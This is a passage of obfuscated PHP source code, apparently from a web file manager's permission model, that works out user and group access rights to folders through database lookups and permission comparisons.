$ü£∑·¢∫[$êµöæûÂ[32]], $êµöæûÂ[193] => $ü£∑·¢∫[$êµöæûÂ[90]][$êµöæûÂ[193]], $êµöæûÂ[87] => KodIO::make($ü£∑·¢∫[$êµöæûÂ[90]][$êµöæûÂ[193]]), $êµöæûÂ[192] => $êµöæûÂ[228], $êµöæûÂ[190] => $êµöæûÂ[586], $êµöæûÂ[33] => $êµöæûÂ[624], $êµöæûÂ[590] => $ü£∑·¢∫[$êµöæûÂ[597]], $êµöæûÂ[1963] => $ü£∑·¢∫[$êµöæûÂ[1963]], $êµöæûÂ[594] => $ü£∑·¢∫[$êµöæûÂ[192]], $êµöæûÂ[2151] => array($Ü∂å®Ω≈)); $Ÿ‚—›ï≤[$©ÇÚÎ‡ñ[$êµöæûÂ[193]]] = $©ÇÚÎ‡ñ; } } $ÁÉ∂«Ï¿ = array(); $Õõ•Ü–Ü = $this->getAllChildren($îÍ÷Ã„¶); foreach ($Õõ•Ü–Ü as $¬é˘—åı) { $å÷Ñê—« = !1; foreach ($¬é˘—åı[$êµöæûÂ[2151]] as $—´ä∑ñµ) { if ($—´ä∑ñµ[$êµöæûÂ[1764]]) { if ($—´ä∑ñµ[$êµöæûÂ[1764]] == $»≈öäáŒ) { $å÷Ñê—« = !0; break; } } if ($—´ä∑ñµ[$êµöæûÂ[1963]]) { if ($this->groupContainUser($—´ä∑ñµ[$êµöæûÂ[1963]], $»≈öäáŒ)) { $å÷Ñê—« = !0; break; } } } if ($å÷Ñê—«) { $ÁÉ∂«Ï¿[] = $¬é˘—åı; } $ãêç–“” = $¬é˘—åı[$êµöæûÂ[193]]; if (isset($Ÿ‚—›ï≤[$ãêç–“”])) { $¬é˘—åı[$êµöæûÂ[2151]][] = $Ÿ‚—›ï≤[$ãêç–“”][0]; $Ÿ‚—›ï≤[$ãêç–“”] = !1; } } $Ÿ‚—›ï≤ = array_filter(array_values($Ÿ‚—›ï≤)); $ÁÉ∂«Ï¿ = array_merge($Ÿ‚—›ï≤, $ÁÉ∂«Ï¿); return $ÁÉ∂«Ï¿; } public function setAllChildrenByUser($‡œÕ˚Èâ, $ƒ“ØÌΩé, $∑‘Ô“Ó’) { $‘Íè˙–ñ =& $_SERVER[ß⁄ˆÇ†Œ]; $üÃ˘ÛÂÖ = $this->getAllChildrenByUser($‡œÕ˚Èâ, $ƒ“ØÌΩé); if (!$∑‘Ô“Ó’ || !$üÃ˘ÛÂÖ) { return !1; } foreach ($üÃ˘ÛÂÖ as $±¶ÃñÉÛ) { $â≥Í¨ãÍ = array(); foreach ($±¶ÃñÉÛ[$‘Íè˙–ñ[2151]] as $›∂Õ√∞ı) { $ﬂë˚Æ˛ = $›∂Õ√∞ı[$‘Íè˙–ñ[548]]; $úø¥È∫Ñ = $›∂Õ√∞ı[$‘Íè˙–ñ[1764]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $≥‡Ö©ﬁ√ = $›∂Õ√∞ı[$‘Íè˙–ñ[1764]] ? $›∂Õ√∞ı[$‘Íè˙–ñ[1764]] : $›∂Õ√∞ı[$‘Íè˙–ñ[1963]]; if ($›∂Õ√∞ı[$‘Íè˙–ñ[1764]] && $›∂Õ√∞ı[$‘Íè˙–ñ[1764]] == $ƒ“ØÌΩé) { continue; } $â≥Í¨ãÍ[] = array($‘Íè˙–ñ[193] => $±¶ÃñÉÛ[$‘Íè˙–ñ[193]], $‘Íè˙–ñ[190] => $úø¥È∫Ñ, $‘Íè˙–ñ[577] => intval($≥‡Ö©ﬁ√), $‘Íè˙–ñ[2071] => isset($ﬂë˚Æ˛[$‘Íè˙–ñ[483]]) ? intval($ﬂë˚Æ˛[$‘Íè˙–ñ[483]]) : 0, $‘Íè˙–ñ[2131] => isset($ﬂë˚Æ˛[$‘Íè˙–ñ[2131]]) ? intval($ﬂë˚Æ˛[$‘Íè˙–ñ[2131]]) : -1); } $â≥Í¨ãÍ[] = array($‘Íè˙–ñ[193] => $±¶ÃñÉÛ[$‘Íè˙–ñ[193]], $‘Íè˙–ñ[190] => SourceModel::TYPE_USER, $‘Íè˙–ñ[577] => intval($ƒ“ØÌΩé), $‘Íè˙–ñ[2071] => intval($∑‘Ô“Ó’), $‘Íè˙–ñ[2131] => -1); $this->where(array($‘Íè˙–ñ[499] => $±¶ÃñÉÛ[$‘Íè˙–ñ[193]]))->delete(); $this->addAll($â≥Í¨ãÍ); } return !0; } public function get($¿‚Ëõøë) { $äé£´°∏ = $this->getSourceList(array($¿‚Ëõøë), !0); return $äé£´°∏[0]; } public function getSourceList($˛ÛòƒÅù, $íÈ™Û˜≥ = false, $›Ôá–ÆÑ = false) { $»±”É˛• =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$˛ÛòƒÅù) { return array(); } $Ê⁄Õï¯ç = Model($»±”É˛•[1414]); if (!$íÈ™Û˜≥ && count($˛ÛòƒÅù) == 1) { $íÈ™Û˜≥ = array(); $íÈ™Û˜≥[$˛ÛòƒÅù[0]] = $Ê⁄Õï¯ç->sourceInfo($˛ÛòƒÅù[0]); } if (!$íÈ™Û˜≥) { $‹Òá±Á¡ = array($»±”É˛•[499] => array($»±”É˛•[500], $˛ÛòƒÅù)); $íÈ™Û˜≥ = $Ê⁄Õï¯ç->field($»±”É˛•[2155])->where($‹Òá±Á¡)->select(); $íÈ™Û˜≥ = array_to_keyvalue($íÈ™Û˜≥, $»±”É˛•[193]); } $˘»˛™ÇÉ = $˛ÛòƒÅù; foreach ($íÈ™Û˜≥ as $ßÎ—≥¯á => $§â«„◊≥) { $’û˚¸é≈ = $Ê⁄Õï¯ç->parentLevelArray($§â«„◊≥[$»±”É˛•[592]]); $˘»˛™ÇÉ = array_merge($˘»˛™ÇÉ, array($ßÎ—≥¯á), array_reverse($’û˚¸é≈)); } $˘»˛™ÇÉ = array_values(array_unique($˘»˛™ÇÉ)); if (!$˘»˛™ÇÉ) { return array(); } $éãüóÿÂ = $this->sourceAuthSelect($˘»˛™ÇÉ); $≈µ•ƒ≠‘ = array(); foreach ($˘»˛™ÇÉ as $ûãâ»é·) { if (isset($éãüóÿÂ[$ûãâ»é·])) { $≈µ•ƒ≠‘[$ûãâ»é·] = $éãüóÿÂ[$ûãâ»é·]; } } $ä‘ù—¡ü = $this->userIsRoot($›Ôá–ÆÑ); $ùéù„… = AuthModel::authAll(); $òàò´ºƒ = array($»±”É˛•[496] => $ùéù„…, $»±”É˛•[2156] => array($»±”É˛•[501] => 0, $»±”É˛•[1969] => $ùéù„…, $»±”É˛•[502] => LNG($»±”É˛•[2157]), $»±”É˛•[1986] => $»±”É˛•[2158])); $≈âÇçˆØ = array(); foreach ($íÈ™Û˜≥ as $ûãâ»é· => $Ü±´œÔÈ) { if ($ä‘ù—¡ü && $GLOBALS[$»±”É˛•[6]][$»±”É˛•[1982]]) { $≈âÇçˆØ[$ûãâ»é·] = $òàò´ºƒ; continue; } $≈âÇçˆØ[$ûãâ»é·] = $this->makeSourceAuth($Ü±´œÔÈ, $≈µ•ƒ≠‘, $›Ôá–ÆÑ); } return $≈âÇçˆØ; } public function authDeepCheck($Û˝é¸˘ã, $™≤¬òû¸ = false) { $áú§û¢€ =& $_SERVER[ß⁄ˆÇ†Œ]; $™≤¬òû¸ = $™≤¬òû¸ ? $™≤¬òû¸ : USER_ID; $†∞§÷ï≠ = $this->makeAuthDeep($™≤¬òû¸); if (!in_array($Û˝é¸˘ã, $†∞§÷ï≠[$áú§û¢€[2159]])) { return !1; } $ﬁÊÆΩÒ¿ = array(); foreach ($†∞§÷ï≠[$áú§û¢€[2160]] as $àÒÁüîÖ => $ºüÜöôÑ) { if (!in_array($Û˝é¸˘ã, $ºüÜöôÑ)) { continue; } $ﬁÊÆΩÒ¿[] = $àÒÁüîÖ; } if (!$ﬁÊÆΩÒ¿) { return !1; } $Õ¥–ÿÃ = $ﬁÊÆΩÒ¿ ? $ﬁÊÆΩÒ¿[0] : $Û˝é¸˘ã; return array($áú§û¢€[496] => -1, $áú§û¢€[548] => array($áú§û¢€[501] => $áú§û¢€[1269], $áú§û¢€[1969] => $áú§û¢€[228], $áú§û¢€[502] => LNG($áú§û¢€[2161]), $áú§û¢€[1986] => $áú§û¢€[2162]), $áú§û¢€[2163] => LNG($áú§û¢€[2164]), $áú§û¢€[2165] => $this->sourceAuthInfo($Õ¥–ÿÃ)); } protected function makeAuthDeep($ïŸÄ˚·ã = false) { $ÔÙå™˙õ =& $_SERVER[ß⁄ˆÇ†Œ]; static $¬¢πÓﬁ° = array(); $ïŸÄ˚·ã = $ïŸÄ˚·ã ? $ïŸÄ˚·ã : USER_ID; if (isset($¬¢πÓﬁ°[$ïŸÄ˚·ã])) { return $¬¢πÓﬁ°[$ïŸÄ˚·ã]; } $∏€ëÔÔø = Model($ÔÙå™˙õ[2166])->listData(); $Ì…∑∞˚æ = array(); foreach ($∏€ëÔÔø as $√ïÜâ∫±) { if ($√ïÜâ∫±[$ÔÙå™˙õ[495]] == 0 && $√ïÜâ∫±[$ÔÙå™˙õ[1985]] == $ÔÙå™˙õ[91]) { $Ì…∑∞˚æ[] = $√ïÜâ∫±[$ÔÙå™˙õ[483]]; } } $ªÏı Ÿı = $this->userGroupParents($ïŸÄ˚·ã); $ÖÜﬁÁÇ¥ = array($ÔÙå™˙õ[190] => SourceModel::TYPE_USER, $ÔÙå™˙õ[577] => $ïŸÄ˚·ã); if ($ªÏı Ÿı) { $ÖÜﬁÁÇ¥ = array(array($ÔÙå™˙õ[190] => SourceModel::TYPE_USER, $ÔÙå™˙õ[577] => $ïŸÄ˚·ã), array($ÔÙå™˙õ[190] => SourceModel::TYPE_GROUP, $ÔÙå™˙õ[577] => array($ÔÙå™˙õ[500], $ªÏı Ÿı)), $ÔÙå™˙õ[1074] => $ÔÙå™˙õ[2065]); } $¶∏åéóÑ = $this->field($ÔÙå™˙õ[2167])->where($ÖÜﬁÁÇ¥)->select(); $‹Œã„Åê = array(); $öÜì©ß˙ = array_to_keyvalue_group($¶∏åéóÑ, $ÔÙå™˙õ[193]); foreach ($öÜì©ß˙ as $‚È—íÜ => $±é¯›Ø‰) { $´Æ≤ƒÒ√ = $this->authArrayCheck($±é¯›Ø‰, $ïŸÄ˚·ã); if ($´Æ≤ƒÒ√[$ÔÙå™˙õ[496]] > 0) { $‹Œã„Åê[] = $‚È—íÜ . $ÔÙå™˙õ[12]; } } if ($ªÏı Ÿı) { $ç˝¸ä∏ó = Model($ÔÙå™˙õ[593]); foreach ($ªÏı Ÿı as $ò≈πôø∏) { $ÏÔ±‹îı = $ç˝¸ä∏ó->getInfo($ò≈πôø∏); if (!$ÏÔ±‹îı || !is_array($ÏÔ±‹îı[$ÔÙå™˙õ[90]])) { continue; } $‹Œã„Åê[] = $ÏÔ±‹îı[$ÔÙå™˙õ[90]][$ÔÙå™˙õ[193]]; } } $Â¨±‚ﬁí = array(); $Ú∏€¡øü = $ªÏı Ÿı; $Ë†˝ÿ≤ä = Model($ÔÙå™˙õ[1414]); $ç˝¸ä∏ó = Model($ÔÙå™˙õ[593]); $ƒ°Ëµ»ù = array(); $Èÿ∞é®ç = array(); $ê¬ß˜˚¨ = array(); $…∏´ˆ»ñ = array(); if ($‹Œã„Åê) { $Ñ˜∫õ≤ˆ = $Ë†˝ÿ≤ä->where(array($ÔÙå™˙õ[193] => array($ÔÙå™˙õ[500], $‹Œã„Åê)))->select(); foreach ($Ñ˜∫õ≤ˆ as $ŒãéÛ°«) { $÷ãµ¨û∫ = $Ë†˝ÿ≤ä->parentLevelArray($ŒãéÛ°«[$ÔÙå™˙õ[592]]); $Â¨±‚ﬁí = array_merge($Â¨±‚ﬁí, $÷ãµ¨û∫); $Ú∏€¡øü[] = $ŒãéÛ°«[$ÔÙå™˙õ[577]]; $ƒ°Ëµ»ù[$ŒãéÛ°«[$ÔÙå™˙õ[193]]] = $÷ãµ¨û∫; $Èÿ∞é®ç[$ŒãéÛ°«[$ÔÙå™˙õ[193]]] = $ŒãéÛ°«[$ÔÙå™˙õ[577]]; } } $Ú∏€¡øü = array_values(array_unique($Ú∏€¡øü)); $˛É∏Ÿ€¶ = $Ú∏€¡øü; foreach ($˛É∏Ÿ€¶ as $ò≈πôø∏) { $ÏÔ±‹îı = $ç˝¸ä∏ó->getInfo($ò≈πôø∏); $÷ãµ¨û∫ = $Ë†˝ÿ≤ä->parentLevelArray($ÏÔ±‹îı[$ÔÙå™˙õ[592]]); $Ú∏€¡øü = array_merge($Ú∏€¡øü, $÷ãµ¨û∫); } $Ú∏€¡øü = array_values(array_unique($Ú∏€¡øü)); foreach ($Ú∏€¡øü as $ò≈πôø∏) { $ÏÔ±‹îı = $ç˝¸ä∏ó->getInfo($ò≈πôø∏); $Â¨±‚ﬁí[] = $ÏÔ±‹îı[$ÔÙå™˙õ[90]][$ÔÙå™˙õ[193]]; $ê¬ß˜˚¨[$ò≈πôø∏] = $ÏÔ±‹îı[$ÔÙå™˙õ[90]][$ÔÙå™˙õ[193]]; $…∏´ˆ»ñ[$ò≈πôø∏] = $Ë†˝ÿ≤ä->parentLevelArray($ÏÔ±‹îı[$ÔÙå™˙õ[592]]); } foreach ($ƒ°Ëµ»ù as $î´ã˙ﬁà => $“ˆÜÏΩÚ) { $ÇπâÙÔÁ = $Èÿ∞é®ç[$î´ã˙ﬁà]; if (!$ÇπâÙÔÁ || !$ê¬ß˜˚¨[$ÇπâÙÔÁ]) { continue; } $Ù¸Å´¢Ù = array(); foreach ($…∏´ˆ»ñ[$ÇπâÙÔÁ] as $ò≈πôø∏) { $Ù¸Å´¢Ù[] = $ê¬ß˜˚¨[$ò≈πôø∏]; } $ƒ°Ëµ»ù[$î´ã˙ﬁà] = array_merge($Ù¸Å´¢Ù, $“ˆÜÏΩÚ); } $Â¨±‚ﬁí = array_values(array_unique($Â¨±‚ﬁí)); $˝´•™§Ù = array($ÔÙå™˙õ[2159] => $Â¨±‚ﬁí, $ÔÙå™˙õ[2160] => $ƒ°Ëµ»ù); $¬¢πÓﬁ°[$ïŸÄ˚·ã] = $˝´•™§Ù; return $˝´•™§Ù; } private function makeSourceAuth($—◊ÅÔ ‡, $˝˜‡˜≤œ, $ΩÁÂöÛ˘ = false) { $Ùíä®‘ø =& $_SERVER[ß⁄ˆÇ†Œ]; $œÏ√è‘ä = $Ùíä®‘ø[91]; $ßáºÄÔ¶ = $—◊ÅÔ ‡[$Ùíä®‘ø[577]]; $ÏÊ•©¬ = $—◊ÅÔ ‡[$Ùíä®‘ø[190]] == SourceModel::TYPE_GROUP; $˝øÅó«ü = $ÏÊ•©¬ ? $this->groupRootAuth($ßáºÄÔ¶, $ΩÁÂöÛ˘) : !1; if ($˝øÅó«ü && Model($Ùíä®‘ø[579])->authCheckAction($˝øÅó«ü[$Ùíä®‘ø[495]], $Ùíä®‘ø[1984])) { return $this->groupAuthInfo($˝øÅó«ü, $ßáºÄÔ¶); } $ÅÀ±ŒãÂ = Model($Ùíä®‘ø[1414])->parentLevelArray($—◊ÅÔ ‡[$Ùíä®‘ø[592]]); $ÅÀ±ŒãÂ = array_merge(array($—◊ÅÔ ‡[$Ùíä®‘ø[193]]), array_reverse($ÅÀ±ŒãÂ)); $¥í®Ò…è = !1; foreach ($ÅÀ±ŒãÂ as $ÿÎóáÚÑ) { if (!isset($˝˜‡˜≤œ[$ÿÎóáÚÑ])) { continue; } $¨îÖà£û = $this->authMake($˝˜‡˜≤œ[$ÿÎóáÚÑ], $ΩÁÂöÛ˘); if ($¨îÖà£û[$Ùíä®‘ø[548]]) { $¥í®Ò…è = $¨îÖà£û; break; } } if (!$ÏÊ•©¬) { return $¥í®Ò…è; } if (!$¥í®Ò…è && $˝øÅó«ü) { $¥í®Ò…è = $this->groupAuthInfo($˝øÅó«ü, $ßáºÄÔ¶); } if (!$¥í®Ò…è) { $Ú˘ÕúÎŸ = Model($Ùíä®‘ø[593])->getInfo($ßáºÄÔ¶); $Ü„ö´·· = explode($Ùíä®‘ø[50], trim($Ú˘ÕúÎŸ[$Ùíä®‘ø[592]], $Ùíä®‘ø[50])); $Ü„ö´·· = array_reverse($Ü„ö´··); foreach ($Ü„ö´·· as $ﬁ¿Á±Ï‰) { if ($ﬁ¿Á±Ï‰ == $Ùíä®‘ø[228] || $ﬁ¿Á±Ï‰ == $œÏ√è‘ä) { continue; } $¸Ëøˆ•Ë = $this->groupRootAuth($ﬁ¿Á±Ï‰, $ΩÁÂöÛ˘); if (!$¸Ëøˆ•Ë) { continue; } $¥í®Ò…è = $this->groupAuthInfo($¸Ëøˆ•Ë, $ﬁ¿Á±Ï‰); break; } } if (!$¥í®Ò…è || $¥í®Ò…è[$Ùíä®‘ø[496]] <= 0) { $Ôó¿Ö∆÷ = $this->authDeepCheck($—◊ÅÔ ‡[$Ùíä®‘ø[193]], $ΩÁÂöÛ˘); if ($Ôó¿Ö∆÷) { $¥í®Ò…è = $Ôó¿Ö∆÷; } } return $¥í®Ò…è; } private function userIsRoot($–Ú‰√’≈ = false) { $ŒÉçÇ–À =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$–Ú‰√’≈ && KodUser::isRoot()) { return !0; } $æÊÿ˘òÃ = Model($ŒÉçÇ–À[606])->getInfo($–Ú‰√’≈); $€òÖ‡˛˙ = Model($ŒÉçÇ–À[2168])->listData($æÊÿ˘òÃ[$ŒÉçÇ–À[2169]]); if ($€òÖ‡˛˙ && $€òÖ‡˛˙[$ŒÉçÇ–À[583]][$ŒÉçÇ–À[2170]] == 1) { return !0; } return !1; } private function sourceAuthInfo($√¡ôò◊ö) { $‘ÿ…øÛÿ =& $_SERVER[ß⁄ˆÇ†Œ]; $◊¢‚˛“÷ = Model($‘ÿ…øÛÿ[1414]); $ƒéÓ•“î = $◊¢‚˛“÷->sourceInfo($√¡ôò◊ö); if (!$ƒéÓ•“î) { return !1; } $◊¢‚˛“÷->groupPathDisplay($ƒéÓ•“î); $ï™∑√º— = array($ƒéÓ•“î); $ï™∑√º— = $◊¢‚˛“÷->_listAppendPath($ï™∑√º—); $ƒéÓ•“î = $ï™∑√º—[0]; $ÆÇ‡ù§∏ = $ƒéÓ•“î[$‘ÿ…øÛÿ[590]]; if (isset($ƒéÓ•“î[$‘ÿ…øÛÿ[598]])) { $˜Í®á∂µ = explode($‘ÿ…øÛÿ[8], trim($ƒéÓ•“î[$‘ÿ…øÛÿ[590]], $‘ÿ…øÛÿ[8])); array_shift($˜Í®á∂µ); $ÆÇ‡ù§∏ = $ƒéÓ•“î[$‘ÿ…øÛÿ[596]] . $‘ÿ…øÛÿ[2171] . implode($‘ÿ…øÛÿ[8], $˜Í®á∂µ); } return array($‘ÿ…øÛÿ[502] => $ƒéÓ•“î[$‘ÿ…øÛÿ[32]], $‘ÿ…øÛÿ[87] => KodIO::make($ƒéÓ•“î[$‘ÿ…øÛÿ[193]]), $‘ÿ…øÛÿ[2172] => $ÆÇ‡ù§∏); } private function groupAuthInfo($Ü–Ô‚çç, $á∆ÃπÜ”) { $”ôÊÑÕ =& $_SERVER[ß⁄ˆÇ†Œ]; $É„ﬁ˙˛≈ = Model($”ôÊÑÕ[593])->getInfo($á∆ÃπÜ”); return array($”ôÊÑÕ[2173] => intval($Ü–Ô‚çç[$”ôÊÑÕ[495]]), $”ôÊÑÕ[2156] => $Ü–Ô‚çç, $”ôÊÑÕ[2174] => LNG($”ôÊÑÕ[2175]), $”ôÊÑÕ[2165] => array($”ôÊÑÕ[502] => $É„ﬁ˙˛≈[$”ôÊÑÕ[32]], $”ôÊÑÕ[87] => KodIO::make($É„ﬁ˙˛≈[$”ôÊÑÕ[90]][$”ôÊÑÕ[193]]), $”ôÊÑÕ[2172] => $É„ﬁ˙˛≈[$”ôÊÑÕ[597]])); } protected function groupRootAuth($õ‡ö©õ•, $Í∞±Ùí” = false) { $€ñ‚éÑ« =& $_SERVER[ß⁄ˆÇ†Œ]; $Í∞±Ùí” = $Í∞±Ùí” ? $Í∞±Ùí” : USER_ID; $ïÂö˝ÍÖ = $Í∞±Ùí” . $€ñ‚éÑ«[2176] . $õ‡ö©õ•; static $˜œ§˜±• = array(); if (isset($˜œ§˜±•[$ïÂö˝ÍÖ])) { return $˜œ§˜±•[$ïÂö˝ÍÖ]; } $±≠∫üÔÌ = Model($€ñ‚éÑ«[593])->getInfo($õ‡ö©õ•); $é·ú›Ô˙ = $this->userGroupList($Í∞±Ùí”); $Ã æ≈‘à = isset($é·ú›Ô˙[$õ‡ö©õ•]) ? $é·ú›Ô˙[$õ‡ö©õ•][$€ñ‚éÑ«[495]] : !1; if ($Ã æ≈‘à && Model($€ñ‚éÑ«[579])->authCheckAction($Ã æ≈‘à[$€ñ‚éÑ«[495]], $€ñ‚éÑ«[1984])) { $˜œ§˜±•[$ïÂö˝ÍÖ] = $Ã æ≈‘à; return $Ã æ≈‘à; } $¿Í∂•Üé = $this->sourceAuthSelect($±≠∫üÔÌ[$€ñ‚éÑ«[90]][$€ñ‚éÑ«[193]]); $ºî’≠õ˘ = $¿Í∂•Üé ? $this->authMake($¿Í∂•Üé, $Í∞±Ùí”) : !1; $◊«Ï„™˘ = $ºî’≠õ˘ ? $ºî’≠õ˘[$€ñ‚éÑ«[548]] : !1; $˜œ§˜±•[$ïÂö˝ÍÖ] = $◊«Ï„™˘ ? $◊«Ï„™˘ : $Ã æ≈‘à; return $˜œ§˜±•[$ïÂö˝ÍÖ]; } public function authOwnerApply($Ó…äÄñ±) { $‚Ì‘îì∆ =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($Ó…äÄñ±[$‚Ì‘îì∆[495]]) || isset($Ó…äÄñ±[$‚Ì‘îì∆[2177]]) && $Ó…äÄñ±[$‚Ì‘îì∆[2177]]) { return $Ó…äÄñ±; } if (AuthModel::authCheckRoot($Ó…äÄñ±[$‚Ì‘îì∆[495]][$‚Ì‘îì∆[496]])) { return $Ó…äÄñ±; } $À‹ΩüØÔ = Model($‚Ì‘îì∆[1414])->parentLevelArray($Ó…äÄñ±[$‚Ì‘îì∆[592]]); $À‹ΩüØÔ = array_merge(array($Ó…äÄñ±[$‚Ì‘îì∆[193]]), array_reverse($À‹ΩüØÔ)); $∏¸ºÆúÌ = $this->sourceAuthSelect($À‹ΩüØÔ); $ß´Ô¿∑– = array(); $í¸¸Òò£ = array(); foreach ($∏¸ºÆúÌ as $ÚÏÄÄºø => $ˆÚÌè™à) { $—ï∞£ôì = $this->authFolderOwnerUser($ˆÚÌè™à); $ß´Ô¿∑–[$ÚÏÄÄºø] = $—ï∞£ôì; $í¸¸Òò£ = array_merge($í¸¸Òò£, $—ï∞£ôì[$‚Ì‘îì∆[670]]); if ($—ï∞£ôì[$‚Ì‘îì∆[2178]]) { break; } } if (count($í¸¸Òò£) == 0) { $í¸¸Òò£ = $this->authFolderOwnerGroup($Ó…äÄñ±[$‚Ì‘îì∆[577]]); } $í¸¸Òò£ = array_unique($í¸¸Òò£); if (AuthModel::authCheckRoot($Ó…äÄñ±[$‚Ì‘îì∆[495]][$‚Ì‘îì∆[496]])) { $í¸¸Òò£[] = USER_ID; } $Ó…äÄñ±[$‚Ì‘îì∆[495]][$‚Ì‘îì∆[2179]] = Model($‚Ì‘îì∆[585])->userListInfo($í¸¸Òò£); return $Ó…äÄñ±; } private function authFolderOwnerGroup($ﬂŒ¡êÍ∂) { $‰òÖ·∑° =& $_SERVER[ß⁄ˆÇ†Œ]; $ƒŒﬁ∂Œ = Model($‰òÖ·∑°[2057])->where(array($‰òÖ·∑°[1963] => $ﬂŒ¡êÍ∂))->select(); $œÉÖÇ†à = array(); if (!$ƒŒﬁ∂Œ) { return $œÉÖÇ†à; } foreach ($ƒŒﬁ∂Œ as $Õ´ïª»ç) { $Ωå∆“£  = $this->authInfo($Õ´ïª»ç); if (AuthModel::authCheckRoot($Ωå∆“£ [$‰òÖ·∑°[495]])) { $œÉÖÇ†à[] = $Õ´ïª»ç[$‰òÖ·∑°[1764]]; } } return $œÉÖÇ†à; } private function authFolderOwnerUser($•»îﬂ¡ú) { $ê¨ûÿ≥ª =& $_SERVER[ß⁄ˆÇ†Œ]; $ı”Õı⁄— = array(); $ﬁêœ∫ßÄ = !1; foreach ($•»îﬂ¡ú as $≠÷âá˚≠) { $¬Ôœøúí = $this->authInfo($≠÷âá˚≠); if ($≠÷âá˚≠[$ê¨ûÿ≥ª[577]] == $ê¨ûÿ≥ª[228]) { $ﬁêœ∫ßÄ = !0; } if ($≠÷âá˚≠[$ê¨ûÿ≥ª[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¬Ôœøúí[$ê¨ûÿ≥ª[495]])) { $ı”Õı⁄—[] = $≠÷âá˚≠[$ê¨ûÿ≥ª[577]]; } } } return array($ê¨ûÿ≥ª[670] => $ı”Õı⁄—, $ê¨ûÿ≥ª[2178] => $ﬁêœ∫ßÄ); } public function authMake($ÂîëÛ¬ô, $¢∏Ãê‰ü = false) { $ÛÉÅﬁØ∆ =& $_SERVER[ß⁄ˆÇ†Œ]; $ËûÙ¶ = $this->authArrayCheck($ÂîëÛ¬ô, $¢∏Ãê‰ü); if ($ËûÙ¶[$ÛÉÅﬁØ∆[2180]]) { $ËûÙ¶[$ÛÉÅﬁØ∆[2180]] = $this->sourceAuthInfo($ËûÙ¶[$ÛÉÅﬁØ∆[2180]]); } return $ËûÙ¶; } public function authArrayCheck($«ÑÊ¥Â√, $≤«Î˜∞≤ = false) { $å‹¯ÖÒ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$«ÑÊ¥Â√) { return array($å‹¯ÖÒ[496] => 0, $å‹¯ÖÒ[548] => !1); } $≤«Î˜∞≤ = $≤«Î˜∞≤ ? $≤«Î˜∞≤ : USER_ID; $æÔÊîºÙ = 0; $É˘„Æí€ = 0; $µ‹¢Èãà = 0; $øºó»ØŒ = 0; $ÅΩÊ∆´ò = 0; $˙ ó¥ôÍ = 0; $–ÇÄøÀ≈ = 1000; $¬∏Ïƒ‘ã = 0; $µ˙…ˆà¸ = 0; $òÒÚıÒâ = 0; $Ó∂»òπ◊ = 0; $Òñ‰”Ø = array($å‹¯ÖÒ[193] => 0); foreach ($«ÑÊ¥Â√ as $Òñ‰”Ø) { $â¨‰⁄π = $this->authInfo($Òñ‰”Ø); if (!$â¨‰⁄π) { continue; } $“¬ø‰ﬁ¶ = $Òñ‰”Ø[$å‹¯ÖÒ[577]]; $¸ÂØØà = intval($â¨‰⁄π[$å‹¯ÖÒ[495]]); if ($Òñ‰”Ø[$å‹¯ÖÒ[190]] == SourceModel::TYPE_USER && $“¬ø‰ﬁ¶ == $≤«Î˜∞≤) { $æÔÊîºÙ = !0; $µ‹¢Èãà = $â¨‰⁄π; $É˘„Æí€ = $¸ÂØØà; } else { if ($Òñ‰”Ø[$å‹¯ÖÒ[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($“¬ø‰ﬁ¶, $≤«Î˜∞≤)) { $øºó»ØŒ = !0; $—”˛ƒîÑ = $this->groupStepToUserGroup($“¬ø‰ﬁ¶, $≤«Î˜∞≤); if ($—”˛ƒîÑ < $–ÇÄøÀ≈) { $–ÇÄøÀ≈ = $—”˛ƒîÑ; $ÅΩÊ∆´ò = $¸ÂØØà; $˙ ó¥ôÍ = $â¨‰⁄π; $¬∏Ïƒ‘ã = $“¬ø‰ﬁ¶; } if ($—”˛ƒîÑ == $–ÇÄøÀ≈ && $¸ÂØØà >= $ÅΩÊ∆´ò) { $ÅΩÊ∆´ò = $¸ÂØØà; $˙ ó¥ôÍ = $â¨‰⁄π; $¬∏Ïƒ‘ã = $“¬ø‰ﬁ¶; } } else { if ($“¬ø‰ﬁ¶ == $å‹¯ÖÒ[228]) { $µ˙…ˆà¸ = !0; $Ó∂»òπ◊ = $â¨‰⁄π; $òÒÚıÒâ = $¸ÂØØà; } } } } if ($æÔÊîºÙ) { $µπ…Äêé = $É˘„Æí€; $â¨‰⁄π = $µ‹¢Èãà; $ôÛƒÏ®π = LNG($å‹¯ÖÒ[2181]); } else { if ($øºó»ØŒ) { $µπ…Äêé = $ÅΩÊ∆´ò; $â¨‰⁄π = $˙ ó¥ôÍ; $±ÆÜŒ«Ñ = Model($å‹¯ÖÒ[593])->getInfo($¬∏Ïƒ‘ã); $ôÛƒÏ®π = $å‹¯ÖÒ[176] . $±ÆÜŒ«Ñ[$å‹¯ÖÒ[597]] . $å‹¯ÖÒ[2182] . LNG($å‹¯ÖÒ[2183]); } else { if ($µ˙…ˆà¸) { $µπ…Äêé = $òÒÚıÒâ; $â¨‰⁄π = $Ó∂»òπ◊; $ôÛƒÏ®π = LNG($å‹¯ÖÒ[2153]); } else { $µπ…Äêé = 0; $â¨‰⁄π = !1; $ôÛƒÏ®π = $å‹¯ÖÒ[12]; } } } $ÎÈ«¶ ¨ = array($å‹¯ÖÒ[2173] => intval($µπ…Äêé), $å‹¯ÖÒ[2156] => $â¨‰⁄π, $å‹¯ÖÒ[2174] => $ôÛƒÏ®π, $å‹¯ÖÒ[2165] => $Òñ‰”Ø[$å‹¯ÖÒ[193]]); return $ÎÈ«¶ ¨; } private function groupContainUser($˘…ƒﬁ’î, $ƒßú±ˆ¯ = false) { return in_array($˘…ƒﬁ’î, $this->userGroupParents($ƒßú±ˆ¯)); } private function groupStepToUserGroup($¯áÂ€ê∫, $º„áÿ£¨ = false) { $Üœø¢Ü” =& $_SERVER[ß⁄ˆÇ†Œ]; $å»’˚ô€ = $this->userGroupList($º„áÿ£¨); $µ¨ëÆÀÛ = 1000; $Ωõ«ØÓ∑ = $GLOBALS[$Üœø¢Ü”[6]][$Üœø¢Ü”[92]][$Üœø¢Ü”[2070]] == 1; $…õà∂Ü‚ = $Ωõ«ØÓ∑ ? 3 : 2; foreach ($å»’˚ô€ as $ﬂ‹üÌñ±) { if 